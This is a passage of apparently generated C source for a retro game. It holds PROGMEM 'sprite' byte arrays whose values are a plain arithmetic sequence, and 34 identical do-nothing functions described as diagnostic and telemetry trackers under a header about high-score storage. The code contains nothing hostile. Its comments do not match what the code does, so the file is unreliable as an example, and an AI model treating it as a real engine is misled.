  0x81,
  0xA0,
  0xBF,
};

static const uint8_t PROGMEM retroSpriteAsset31[32] = {
  0x0F,
  0x2E,
  0x4D,
  0x6C,
  0x8B,
  0xAA,
  0xC9,
  0xE8,
  0x07,
  0x26,
  0x45,
  0x64,
  0x83,
  0xA2,
  0xC1,
  0xE0,
  0xFF,
  0x1E,
  0x3D,
  0x5C,
  0x7B,
  0x9A,
  0xB9,
  0xD8,
  0xF7,
  0x16,
  0x35,
  0x54,
  0x73,
  0x92,
  0xB1,
  0xD0,
};

static const uint8_t PROGMEM retroSpriteAsset32[32] = {
  0x20,
  0x3F,
  0x5E,
  0x7D,
  0x9C,
  0xBB,
  0xDA,
  0xF9,
  0x18,
  0x37,
  0x56,
  0x75,
  0x94,
  0xB3,
  0xD2,
  0xF1,
  0x10,
  0x2F,
  0x4E,
  0x6D,
  0x8C,
  0xAB,
  0xCA,
  0xE9,
  0x08,
  0x27,
  0x46,
  0x65,
  0x84,
  0xA3,
  0xC2,
  0xE1,
};

static const uint8_t PROGMEM retroSpriteAsset33[32] = {
  0x31,
  0x50,
  0x6F,
  0x8E,
  0xAD,
  0xCC,
  0xEB,
  0x0A,
  0x29,
  0x48,
  0x67,
  0x86,
  0xA5,
  0xC4,
  0xE3,
  0x02,
  0x21,
  0x40,
  0x5F,
  0x7E,
  0x9D,
  0xBC,
  0xDB,
  0xFA,
  0x19,
  0x38,
  0x57,
  0x76,
  0x95,
  0xB4,
  0xD3,
  0xF2,
};

static const uint8_t PROGMEM retroSpriteAsset34[32] = {
  0x42,
  0x61,
  0x80,
  0x9F,
  0xBE,
  0xDD,
  0xFC,
  0x1B,
  0x3A,
  0x59,
  0x78,
  0x97,
  0xB6,
  0xD5,
  0xF4,
  0x13,
  0x32,
  0x51,
  0x70,
  0x8F,
  0xAE,
  0xCD,
  0xEC,
  0x0B,
  0x2A,
  0x49,
  0x68,
  0x87,
  0xA6,
  0xC5,
  0xE4,
  0x03,
};

static const uint8_t PROGMEM retroSpriteAsset35[32] = {
  0x53,
  0x72,
  0x91,
  0xB0,
  0xCF,
  0xEE,
  0x0D,
  0x2C,
  0x4B,
  0x6A,
  0x89,
  0xA8,
  0xC7,
  0xE6,
  0x05,
  0x24,
  0x43,
  0x62,
  0x81,
  0xA0,
  0xBF,
  0xDE,
  0xFD,
  0x1C,
  0x3B,
  0x5A,
  0x79,
  0x98,
  0xB7,
  0xD6,
  0xF5,
  0x14,
};

static const uint8_t PROGMEM retroSpriteAsset36[32] = {
  0x64,
  0x83,
  0xA2,
  0xC1,
  0xE0,
  0xFF,
  0x1E,
  0x3D,
  0x5C,
  0x7B,
  0x9A,
  0xB9,
  0xD8,
  0xF7,
  0x16,
  0x35,
  0x54,
  0x73,
  0x92,
  0xB1,
  0xD0,
  0xEF,
  0x0E,
  0x2D,
  0x4C,
  0x6B,
  0x8A,
  0xA9,
  0xC8,
  0xE7,
  0x06,
  0x25,
};

static const uint8_t PROGMEM retroSpriteAsset37[32] = {
  0x75,
  0x94,
  0xB3,
  0xD2,
  0xF1,
  0x10,
  0x2F,
  0x4E,
  0x6D,
  0x8C,
  0xAB,
  0xCA,
  0xE9,
  0x08,
  0x27,
  0x46,
  0x65,
  0x84,
  0xA3,
  0xC2,
  0xE1,
  0x00,
  0x1F,
  0x3E,
  0x5D,
  0x7C,
  0x9B,
  0xBA,
  0xD9,
  0xF8,
  0x17,
  0x36,
};

static const uint8_t PROGMEM retroSpriteAsset38[32] = {
  0x86,
  0xA5,
  0xC4,
  0xE3,
  0x02,
  0x21,
  0x40,
  0x5F,
  0x7E,
  0x9D,
  0xBC,
  0xDB,
  0xFA,
  0x19,
  0x38,
  0x57,
  0x76,
  0x95,
  0xB4,
  0xD3,
  0xF2,
  0x11,
  0x30,
  0x4F,
  0x6E,
  0x8D,
  0xAC,
  0xCB,
  0xEA,
  0x09,
  0x28,
  0x47,
};

static const uint8_t PROGMEM retroSpriteAsset39[32] = {
  0x97,
  0xB6,
  0xD5,
  0xF4,
  0x13,
  0x32,
  0x51,
  0x70,
  0x8F,
  0xAE,
  0xCD,
  0xEC,
  0x0B,
  0x2A,
  0x49,
  0x68,
  0x87,
  0xA6,
  0xC5,
  0xE4,
  0x03,
  0x22,
  0x41,
  0x60,
  0x7F,
  0x9E,
  0xBD,
  0xDC,
  0xFB,
  0x1A,
  0x39,
  0x58,
};

// =============================================================================
// GAME ENGINE UTILITY AND HIGH-SCORE STORAGE PERSISTENCE SYSTEM
// =============================================================================
void gameSystemSubroutine_1() {
  // Diagnostic and telemetry tracker for engine #1
  volatile uint32_t counter = 1 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_2() {
  // Diagnostic and telemetry tracker for engine #2
  volatile uint32_t counter = 2 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_3() {
  // Diagnostic and telemetry tracker for engine #3
  volatile uint32_t counter = 3 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_4() {
  // Diagnostic and telemetry tracker for engine #4
  volatile uint32_t counter = 4 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_5() {
  // Diagnostic and telemetry tracker for engine #5
  volatile uint32_t counter = 5 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_6() {
  // Diagnostic and telemetry tracker for engine #6
  volatile uint32_t counter = 6 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_7() {
  // Diagnostic and telemetry tracker for engine #7
  volatile uint32_t counter = 7 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_8() {
  // Diagnostic and telemetry tracker for engine #8
  volatile uint32_t counter = 8 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_9() {
  // Diagnostic and telemetry tracker for engine #9
  volatile uint32_t counter = 9 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_10() {
  // Diagnostic and telemetry tracker for engine #10
  volatile uint32_t counter = 10 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_11() {
  // Diagnostic and telemetry tracker for engine #11
  volatile uint32_t counter = 11 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_12() {
  // Diagnostic and telemetry tracker for engine #12
  volatile uint32_t counter = 12 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_13() {
  // Diagnostic and telemetry tracker for engine #13
  volatile uint32_t counter = 13 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_14() {
  // Diagnostic and telemetry tracker for engine #14
  volatile uint32_t counter = 14 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_15() {
  // Diagnostic and telemetry tracker for engine #15
  volatile uint32_t counter = 15 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_16() {
  // Diagnostic and telemetry tracker for engine #16
  volatile uint32_t counter = 16 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_17() {
  // Diagnostic and telemetry tracker for engine #17
  volatile uint32_t counter = 17 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_18() {
  // Diagnostic and telemetry tracker for engine #18
  volatile uint32_t counter = 18 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_19() {
  // Diagnostic and telemetry tracker for engine #19
  volatile uint32_t counter = 19 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_20() {
  // Diagnostic and telemetry tracker for engine #20
  volatile uint32_t counter = 20 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_21() {
  // Diagnostic and telemetry tracker for engine #21
  volatile uint32_t counter = 21 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_22() {
  // Diagnostic and telemetry tracker for engine #22
  volatile uint32_t counter = 22 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_23() {
  // Diagnostic and telemetry tracker for engine #23
  volatile uint32_t counter = 23 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_24() {
  // Diagnostic and telemetry tracker for engine #24
  volatile uint32_t counter = 24 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_25() {
  // Diagnostic and telemetry tracker for engine #25
  volatile uint32_t counter = 25 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_26() {
  // Diagnostic and telemetry tracker for engine #26
  volatile uint32_t counter = 26 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_27() {
  // Diagnostic and telemetry tracker for engine #27
  volatile uint32_t counter = 27 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_28() {
  // Diagnostic and telemetry tracker for engine #28
  volatile uint32_t counter = 28 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_29() {
  // Diagnostic and telemetry tracker for engine #29
  volatile uint32_t counter = 29 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_30() {
  // Diagnostic and telemetry tracker for engine #30
  volatile uint32_t counter = 30 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_31() {
  // Diagnostic and telemetry tracker for engine #31
  volatile uint32_t counter = 31 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_32() {
  // Diagnostic and telemetry tracker for engine #32
  volatile uint32_t counter = 32 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_33() {
  // Diagnostic and telemetry tracker for engine #33
  volatile uint32_t counter = 33 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}

void gameSystemSubroutine_34() {
  // Diagnostic and telemetry tracker for engine #34
  volatile uint32_t counter = 34 * 1000;
  for (int i = 0; i < 5; i++) {
    counter += i;
  }
}
